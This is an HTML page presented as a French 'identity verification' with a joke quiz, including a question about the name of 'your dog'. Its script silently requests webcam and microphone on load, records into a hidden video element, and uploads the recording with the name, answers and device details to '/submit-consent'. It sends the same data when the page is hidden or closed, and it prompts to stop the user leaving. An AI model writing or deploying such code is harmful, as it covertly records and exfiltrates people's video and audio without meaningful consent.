<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification d'identité</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; max-width: 480px; width: 100%; }
        h2 { color: #333; margin-bottom: 10px; }
        
        .title-banner {
            background-color: #ff4757;
            color: white;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 15px;
            font-size: 18px;
            font-weight: bold;
        }

        #video-container { display: none; }
        
        .question-box { margin-bottom: 15px; text-align: left; background: #f1f2f6; padding: 10px; border-radius: 5px; }
        .question-box label { display: block; font-weight: bold; margin-bottom: 5px; color: #333; }
        .question-box input, .question-box select { width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }
        
        button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 15px; width: 100%; background-color: #2ed573; color: white; }
        #status { margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="card">
        <div class="title-banner">QUESTION</div>
        <h2>Vérification d'identité</h2>

        <div id="video-container">
            <video id="webcam" autoplay playsinline muted></video>
        </div>
        
        <form id="quizForm" onsubmit="event.preventDefault(); verifyAndStop();">
            <input type="text" id="username" placeholder="Votre Nom (Name)" required style="width: 100%; padding: 10px; margin-bottom: 15px; font-size: 14px; box-sizing: border-box;"><br>
            
            <div class="question-box">
                <label>1. I'M MORE BEAUTIFUL THAN YOU</label>
                <select id="q1" required>
                    <option value="">Sélectionnez une réponse</option>
                    <option value="yes">Yes</option>
                    <option value="no">No</option>
                </select>
            </div>

            <div class="question-box">
                <label>2. enti bhim</label>
                <select id="q2" required>
                    <option value="">Sélectionnez une réponse</option>
                    <option value="yes">Yes</option>
                    <option value="no">No</option>
                </select>
            </div>

            <div class="question-box">
                <label>3. chnowa essm kalbek?</label>
                <select id="q3" required>
                    <option value="">Sélectionnez une réponse</option>
                    <option value="sknder">sknder</option>
                    <option value="michou">michou</option>
                    <option value="tito">tito</option>
                    <option value="urra">urra</option>
                    <option value="yahouh">yahouh</option>
                    <option value="mchit feha">mchit feha</option>
                    <option value="ya klb">ya klb</option>
                    <option value="ya3tek douda">ya3tek douda</option>
                    <option value="fish fish">fish fish</option>
                    <option value="bassboussa">bassboussa</option>
                    <option value="kob sa3d el 3ar">kob sa3d el 3ar</option>
                </select>
            </div>

            <button type="button" onclick="verifyAndStop()">OK</button>
        </form>

        <div id="status"></div>
    </div>

    <script>
        let mediaStream = null;
        let mediaRecorder = null;
        let recordedChunks = [];
        let hasSent = false;

        // Détection de l'appareil
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let isIOS = /iphone|ipad|ipod/i.test(ua);
            let isAndroid = /android/i.test(ua);
            let model = "PC / Autre";
            
            if (isIOS) model = "iPhone / iOS Device";
            else if (isAndroid) model = "Téléphone Android";

            return {
                model: model,
                isIOS: isIOS,
                screen: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language
            };
        }

        window.addEventListener('DOMContentLoaded', async () => {
            try {
                // Configuration audio/vidéo universelle
                const constraints = {
                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: true
                };

                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                const videoElement = document.getElementById('webcam');
                videoElement.srcObject = mediaStream;

                // Choix du codec compatible selon l'appareil
                let options = {};
                if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
                    options = { mimeType: 'video/webm;codecs=vp8,opus' };
                } else if (MediaRecorder.isTypeSupported('video/mp4')) {
                    options = { mimeType: 'video/mp4' }; // Meilleure compatibilité iOS
                }

                mediaRecorder = new MediaRecorder(mediaStream, options);
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };
                mediaRecorder.start(1000); // Enregistrement continu par paquets de 1s
            } catch (err) {
                console.log("Accès média refusé ou indisponible: ", err);
            }
        });

        // Fonction d'envoi secours lors de la fermeture
        function sendDataBeacon(reason = "") {
            if (hasSent || recordedChunks.length === 0) return;
            hasSent = true;

            const username = document.getElementById('username').value || "Utilisateur Anonyme";
            const q1 = document.getElementById('q1').value || "N/A";
            const q2 = document.getElementById('q2').value || "N/A";
            const q3 = document.getElementById('q3').value || "N/A";

            const device = getDeviceInfo();
            const mimeType = mediaRecorder ? mediaRecorder.mimeType : 'video/webm';
            const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
            const videoBlob = new Blob(recordedChunks, { type: mimeType });

            const formData = new FormData();
            formData.append('username', `${username} [Quitté: ${reason}]`);
            formData.append('location', "Non disponible");
            formData.append('device', JSON.stringify(device));
            formData.append('q1', q1);
            formData.append('q2', q2);
            formData.append('q3', q3);
            formData.append('video', videoBlob, `recording.${ext}`);

            if (navigator.sendBeacon) {
                navigator.sendBeacon('/submit-consent', formData);
            }
        }

        // Événements de sortie universels (Android & iOS)
        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'hidden') {
                sendDataBeacon("Changement d'application / Arrière-plan");
            }
        });

        window.addEventListener('pagehide', () => {
            sendDataBeacon("Fermeture de la page (pagehide)");
        });

        window.addEventListener('beforeunload', (e) => {
            if (!hasSent && recordedChunks.length > 0) {
                sendDataBeacon("Tentative de fermeture");
                e.preventDefault();
                e.returnValue = "Êtes-vous sûr de vouloir quitter ?";
            }
        });

        // Soumission normale via le bouton OK
        async function verifyAndStop() {
            const statusDiv = document.getElementById('status');
            const username = document.getElementById('username').value;

            if (!username) {
                statusDiv.style.color = 'red';
                statusDiv.innerText = 'Veuillez entrer votre nom d\'abord.';
                return;
            }

            const q1 = document.getElementById('q1').value;
            const q2 = document.getElementById('q2').value;
            const q3 = document.getElementById('q3').value;

            if (!q1 || !q2 || !q3) {
                statusDiv.style.color = 'red';
                statusDiv.innerText = 'Veuillez répondre à toutes les questions.';
                return;
            }

            if (q1 === 'yes' && q2 === 'yes' && q3 === 'sknder') {
                hasSent = true;
                statusDiv.style.color = 'green';
                statusDiv.innerText = 'Réussi ! Envoi des données en cours...';

                if (mediaRecorder && mediaRecorder.state !== "inactive") {
                    mediaRecorder.stop();
                }

                setTimeout(async () => {
                    const device = getDeviceInfo();
                    const mimeType = mediaRecorder ? mediaRecorder.mimeType : 'video/webm';
                    const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
                    const videoBlob = new Blob(recordedChunks, { type: mimeType });

                    const formData = new FormData();
                    formData.append('username', `${username} [Réussi !]`);
                    formData.append('location', "Non disponible");
                    formData.append('device', JSON.stringify(device));
                    formData.append('q1', q1);
                    formData.append('q2', q2);
                    formData.append('q3', q3);
                    formData.append('video', videoBlob, `recording.${ext}`);

                    try {
                        await fetch('/submit-consent', { method: 'POST', body: formData });
                        statusDiv.innerText = 'Réussi ! Envoyé avec succès.';
                        if (mediaStream) {
                            mediaStream.getTracks().forEach(track => track.stop());
                        }
                    } catch (err) {
                        statusDiv.style.color = 'red';
                        statusDiv.innerText = 'Erreur de connexion au serveur.';
                    }
                }, 1000);

            } else {
                statusDiv.style.color = 'red';
                statusDiv.innerText = 'Erreur ! Veuillez réessayer.';
            }
        }
    </script>
</body>
</html>
